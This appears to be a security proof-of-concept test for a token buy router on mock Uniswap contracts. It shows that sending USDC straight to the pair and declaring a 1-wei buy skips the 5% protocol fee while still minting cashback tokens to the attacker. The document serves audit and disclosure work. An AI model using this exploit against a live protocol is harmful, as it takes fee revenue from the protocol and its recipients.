import { describe, it } from "node:test";
import assert from "node:assert/strict";
import hre from "hardhat";
import { parseEther, parseUnits, getContractAddress, zeroAddress } from "viem";

const { viem, networkHelpers } = await hre.network.connect();

async function deployFixture() {
  const wallets = await viem.getWalletClients();
  const owner = wallets[0]!;
  const userA = wallets[1]!; // Scenario A User
  const userB = wallets[2]!; // Scenario B User
  const vault = wallets[3]!;
  const marketing = wallets[4]!;
  const community = wallets[5]!;

  const usdcContract = await viem.deployContract("contracts/test/MockUSDC.sol:MockUSDC", [], { client: { wallet: owner } });
  const usdc = await viem.getContractAt("MockUSDC", usdcContract.address);
  const usdcAddress = usdcContract.address;

  const factoryContract = await viem.deployContract("MockUniswapV2Factory", [], { client: { wallet: owner } });
  const factoryAddress = factoryContract.address;
  const factory = await viem.getContractAt("MockUniswapV2Factory", factoryAddress);

  const routerContract = await viem.deployContract("MockUniswapV2Router", [factoryAddress, usdcAddress], { client: { wallet: owner } });
  const routerAddress = routerContract.address;

  const publicClient = await viem.getPublicClient();
  const n0 = BigInt(await publicClient.getTransactionCount({ address: owner.account.address, blockTag: "pending" }));
  const futureTcgv = getContractAddress({ from: owner.account.address, nonce: n0 + 1n });
  const nexusAddr = getContractAddress({ from: owner.account.address, nonce: n0 });

  await viem.deployContract("TCGNexusToken", [futureTcgv, owner.account.address, vault.account.address], { client: { wallet: owner } });
  const tcgvContract = await viem.deployContract("TCGVaultToken", [
    zeroAddress,
    routerAddress,
    vault.account.address,
    marketing.account.address,
    community.account.address,
    nexusAddr,
    owner.account.address,
  ], { client: { wallet: owner } });
  const tcgvAddress = tcgvContract.address;
  const tcgv = await viem.getContractAt("TCGVaultToken", tcgvAddress);

  const nexus = await viem.getContractAt("TCGNexusToken", nexusAddr);

  await factory.write.createPair([tcgvAddress, usdcAddress], { account: owner.account });
  const pairAddress = await factory.read.getPair([tcgvAddress, usdcAddress]);
  const pair = await viem.getContractAt("MockUniswapV2Pair", pairAddress);
  await tcgv.write.setPair([pairAddress, true], { account: owner.account });

  const mintAmount = parseEther("1000000");
  const liqAmount = parseEther("900000");
  await tcgv.write.mintPresale([owner.account.address, mintAmount], { account: owner.account });

  const buyRouter = await viem.deployContract("TCGVaultBuyRouter", [
    routerAddress,
    usdcAddress,
    tcgvAddress,
    vault.account.address,
    marketing.account.address,
    community.account.address,
  ], { client: { wallet: owner } });

  await tcgv.write.setBuyRouter([buyRouter.address], { account: owner.account });
  // Verify that the BuyRouter is excluded from fees in the production setup.
  // This exclusion is essential so the router does not pay the 6% DEX pair fee when transferring tokens to the user.
  assert.strictEqual(await tcgv.read.isExcludedFromFees([buyRouter.address]), true);

  // Seed LP pool
  const usdcLiq = parseUnits("10000", 6);
  await usdc.write.mint([owner.account.address, usdcLiq], { account: owner.account });
  await usdc.write.transfer([pairAddress, usdcLiq], { account: owner.account });
  await tcgv.write.transfer([pairAddress, liqAmount], { account: owner.account });
  await pair.write.mint([owner.account.address], { account: owner.account });

  return { owner, userA, userB, vault, marketing, community, usdc, tcgv, nexus, buyRouter, pair, publicClient };
}

describe("TCGVaultBuyRouter - Fee Accounting Mismatch", function () {
  it("Proves protocol loses fee revenue when DEX pair contains pre-existing balances", async function () {
    const fixA = await networkHelpers.loadFixture(deployFixture);
    
    // Capital: 1000 USDC
    const capital = parseUnits("1000", 6);
    const configuredFeeBasisPoints = 500n; // 5% total fee on USDC buys
    
    // ==========================================
    // SCENARIO A: Normal Buy
    // ==========================================
    await fixA.usdc.write.mint([fixA.userA.account.address, capital], { account: fixA.owner.account });
    await fixA.usdc.write.approve([fixA.buyRouter.address, capital], { account: fixA.userA.account });

    const uUsdcBeforeA = await fixA.usdc.read.balanceOf([fixA.userA.account.address]);
    
    // To calculate true swap input, we measure pair reserves.
    // getReserves() in MockUniswapV2Pair matches PancakeSwap V2 behavior.
    const reservesBeforeA = await fixA.pair.read.getReserves();
    const usdcReserveIndexA = (await fixA.pair.read.token0()).toLowerCase() === fixA.usdc.address.toLowerCase() ? 0 : 1;
    const pairReserveBeforeA = usdcReserveIndexA === 0 ? reservesBeforeA[0] : reservesBeforeA[1];

    const vaultFeesBeforeA = await fixA.buyRouter.read.pendingUsdcFees([fixA.vault.account.address]);
    const marketingFeesBeforeA = await fixA.buyRouter.read.pendingUsdcFees([fixA.marketing.account.address]);
    const uTcgvBeforeA = await fixA.tcgv.read.balanceOf([fixA.userA.account.address]);

    await fixA.buyRouter.write.buyTCGVWithUSDC([capital, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)], { account: fixA.userA.account });

    const uUsdcAfterA = await fixA.usdc.read.balanceOf([fixA.userA.account.address]);
    const reservesAfterA = await fixA.pair.read.getReserves();
    const pairReserveAfterA = usdcReserveIndexA === 0 ? reservesAfterA[0] : reservesAfterA[1];
    
    const vaultFeesAfterA = await fixA.buyRouter.read.pendingUsdcFees([fixA.vault.account.address]);
    const marketingFeesAfterA = await fixA.buyRouter.read.pendingUsdcFees([fixA.marketing.account.address]);
    const uTcgvAfterA = await fixA.tcgv.read.balanceOf([fixA.userA.account.address]);

    const actualUserSpentA = uUsdcBeforeA - uUsdcAfterA;
    // The actual amount consumed by the swap is the difference in reserves.
    const actualSwapInputA = pairReserveAfterA - pairReserveBeforeA;
    const protocolFeeCollectedA = (vaultFeesAfterA - vaultFeesBeforeA) + (marketingFeesAfterA - marketingFeesBeforeA);
    const expectedFeeForActualSwapInputA = (actualSwapInputA * configuredFeeBasisPoints) / 9500n; // 50 / 950 = expected fee based on swap input
    const feeShortfallA = expectedFeeForActualSwapInputA - protocolFeeCollectedA;
    const tcgvReceivedA = uTcgvAfterA - uTcgvBeforeA;

    // Verify Scenario A is correct
    assert.strictEqual(actualUserSpentA, capital, "Scenario A: User spent 1000 USDC");
    assert.strictEqual(protocolFeeCollectedA, 50000000n, "Scenario A: 50 USDC fee collected");
    assert.strictEqual(actualSwapInputA, 950000000n, "Scenario A: 950 USDC swapped");
    assert.strictEqual(feeShortfallA, 0n, "Scenario A should have zero fee shortfall");

    // Reset environment by deploying a fresh fixture
    const fixB = await networkHelpers.loadFixture(deployFixture);
    
    // ==========================================
    // SCENARIO B: Pre-existing Pair Balance Attack
    // ==========================================
    await fixB.usdc.write.mint([fixB.userB.account.address, capital], { account: fixB.owner.account });
    
    const dust = 1n; // 1 wei declared input
    const directTransfer = capital - dust;
    
    // 1. Attacker transfers capital minus 1 wei directly to the pair
    await fixB.usdc.write.transfer([fixB.pair.address, directTransfer], { account: fixB.userB.account });
    
    // 2. Attacker approves 1 wei to the router
    await fixB.usdc.write.approve([fixB.buyRouter.address, dust], { account: fixB.userB.account });

    // Note: To properly calculate the actual swap input in a fee-on-transfer supporting swap,
    // the router computes: amountInput = balance - reserve.
    // Therefore, the true amount processed by the swap logic is the delta between the pair's RESERVE
    // BEFORE the buy router call, and the pair's RESERVE AFTER the buy router call.
    // This correctly isolates the AMM swap logic execution.
    const reservesBeforeB = await fixB.pair.read.getReserves();
    const usdcReserveIndexB = (await fixB.pair.read.token0()).toLowerCase() === fixB.usdc.address.toLowerCase() ? 0 : 1;
    const pairReserveBeforeB = usdcReserveIndexB === 0 ? reservesBeforeB[0] : reservesBeforeB[1];
    
    const vaultFeesBeforeB = await fixB.buyRouter.read.pendingUsdcFees([fixB.vault.account.address]);
    const marketingFeesBeforeB = await fixB.buyRouter.read.pendingUsdcFees([fixB.marketing.account.address]);
    const uTcgvBeforeB = await fixB.tcgv.read.balanceOf([fixB.userB.account.address]);
    const uNexusBeforeB = await fixB.nexus.read.balanceOf([fixB.userB.account.address]);

    // 3. Attacker calls buy router with 1 wei
    await fixB.buyRouter.write.buyTCGVWithUSDC([dust, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)], { account: fixB.userB.account });

    const reservesAfterB = await fixB.pair.read.getReserves();
    const pairReserveAfterB = usdcReserveIndexB === 0 ? reservesAfterB[0] : reservesAfterB[1];
    
    const vaultFeesAfterB = await fixB.buyRouter.read.pendingUsdcFees([fixB.vault.account.address]);
    const marketingFeesAfterB = await fixB.buyRouter.read.pendingUsdcFees([fixB.marketing.account.address]);
    const uTcgvAfterB = await fixB.tcgv.read.balanceOf([fixB.userB.account.address]);
    const uNexusAfterB = await fixB.nexus.read.balanceOf([fixB.userB.account.address]);

    // The pair's reserve delta is the exact amount the AMM consumed to calculate the TCGV output.
    // Line 225 of TCGVaultBuyRouter.sol: `amountInput = IERC20(input).balanceOf(address(pair)) - reserveInput;`
    // Line 227 of TCGVaultBuyRouter.sol: `amountOutput = _getAmountOut(amountInput, reserveInput, reserveOutput);`
    const actualSwapInputB = pairReserveAfterB - pairReserveBeforeB;
    const protocolFeeCollectedB = (vaultFeesAfterB - vaultFeesBeforeB) + (marketingFeesAfterB - marketingFeesBeforeB);
    
    // The expected fee is what the protocol *should* have earned if it collected 5% on a trade that ultimately swapped `actualSwapInputB`.
    // We use actualSwapInputB * 500 / 9500 to find the corresponding fee for that swap size.
    const expectedFeeForActualSwapInputB = (actualSwapInputB * configuredFeeBasisPoints) / 9500n;
    const feeShortfallB = expectedFeeForActualSwapInputB - protocolFeeCollectedB;
    const tcgvReceivedB = uTcgvAfterB - uTcgvBeforeB;
    const nexusReceivedB = uNexusAfterB - uNexusBeforeB;

    console.log("=================================================");
    console.log("FEE ACCOUNTING MISMATCH ATTACK SUMMARY");
    console.log("=================================================");
    
    console.log("SCENARIO A (NORMAL BUY):");
    console.log(`- Declared USDC input      : ${capital.toString()}`);
    console.log(`- Actual swap input        : ${actualSwapInputA.toString()}`);
    console.log(`- Expected protocol fee    : ${expectedFeeForActualSwapInputA.toString()}`);
    console.log(`- Actual protocol fee      : ${protocolFeeCollectedA.toString()}`);
    console.log(`- Fee shortfall            : ${feeShortfallA.toString()}`);
    console.log(`- TCGV received            : ${tcgvReceivedA.toString()}`);
    
    console.log("-------------------------------------------------");
    console.log("SCENARIO B (PRE-EXISTING PAIR BALANCE):");
    console.log(`- Declared USDC input      : ${dust.toString()}`);
    console.log(`- Actual swap input        : ${actualSwapInputB.toString()}`);
    console.log(`- Expected protocol fee    : ${expectedFeeForActualSwapInputB.toString()}`);
    console.log(`- Actual protocol fee      : ${protocolFeeCollectedB.toString()}`);
    console.log(`- Fee shortfall            : ${feeShortfallB.toString()}`);
    console.log(`- TCGV received            : ${tcgvReceivedB.toString()}`);
    console.log(`- NEXUS minted to attacker : ${nexusReceivedB.toString()}`);
    console.log("=================================================");

    console.log(`Protocol Fee Revenue Loss: ${feeShortfallB.toString()} USDC wei`);

    // Assert Scenario B bypasses fees while producing massive input mismatch
    // 1. Declared input is 1 wei
    assert.strictEqual(dust, 1n, "Scenario B declared input is 1 wei");
    
    // 2. Actual swap input is significantly larger than 1 wei
    assert.ok(actualSwapInputB > dust, "Actual swap input is significantly larger than 1 wei");
    assert.strictEqual(actualSwapInputB, capital, "The AMM absorbed the entire 1000 USDC capital");
    
    // 3. Protocol fee collected is less than the fee that should correspond to the actual swap input
    assert.ok(protocolFeeCollectedB < expectedFeeForActualSwapInputB, "Protocol fee collected is less than expected fee");
    assert.strictEqual(protocolFeeCollectedB, 0n, "Zero fees collected");
    
    // 4. feeShortfall > 0
    assert.ok(feeShortfallB > 0n, "Fee shortfall > 0");
    
    // 5. Assert NEXUS tokens minted to the attacker based on the swap output
    // Line 295 of TCGVaultBuyRouter.sol: `_tcgv.recordBuyAndMintCashback(msg.sender, tcgvReceived);`
    assert.ok(nexusReceivedB > 0n, "NEXUS tokens were minted to the attacker");
  });
});
